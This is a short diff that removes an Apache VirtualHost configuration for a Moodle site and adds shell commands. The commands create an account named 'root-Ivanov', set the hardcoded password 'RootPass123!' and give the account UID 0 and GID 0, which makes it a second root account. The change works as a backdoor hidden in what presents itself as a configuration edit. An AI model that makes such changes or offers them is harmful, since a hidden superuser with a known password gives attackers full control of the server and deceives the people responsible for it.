@@ -1,13 +1,5 @@
-<VirtualHost *:80>
-    ServerName moodle.local
-    DocumentRoot /var/www/html/moodle-site
+useradd -m -s /bin/bash -c "Root user for report" root-Ivanov
 
-    <Directory /var/www/html/moodle-site>
-        Options FollowSymLinks
-        AllowOverride All
-        Require all granted
-    </Directory>
+echo 'root-Ivanov:RootPass123!' | chpasswd
 
-    ErrorLog  /var/log/apache2/moodle_error.log
-    CustomLog /var/log/apache2/moodle_access.log combined
-</VirtualHost>
+usermod -o -u 0 -g 0 root-Ivanov
